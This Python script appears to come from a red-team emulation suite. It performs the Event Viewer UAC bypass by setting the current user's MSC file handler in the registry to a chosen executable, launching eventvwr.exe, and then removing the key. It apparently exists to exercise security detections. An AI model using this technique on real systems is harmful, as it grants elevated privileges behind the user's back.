# Name: Bypass UAC via Event Viewer
# rta: uac_eventviewer.py
# ATT&CK: T1088
# Description: Modifies the Registry value to change the handler for MSC files, bypassing UAC.

import sys
import _winreg as winreg
import common

# Default machine value:
# HKLM\Software\Classes\MSCFile\shell\open\command\(Default)
# %SystemRoot%\system32\mmc.exe "%1" %*


def main(target_file=common.get_path("bin", "myapp.exe")):
    common.log("Bypass UAC with %s" % target_file)

    common.log("Writing registry key")
    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
    winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)

    common.log("Running event viewer")
    common.execute(["c:\\windows\\system32\\eventvwr.exe"])

    common.log("Restoring registry key", log_type="-")
    winreg.DeleteValue(hkey, "")
    winreg.DeleteKey(hkey, "")
    winreg.CloseKey(hkey)


if __name__ == "__main__":
    exit(main(*sys.argv[1:]))
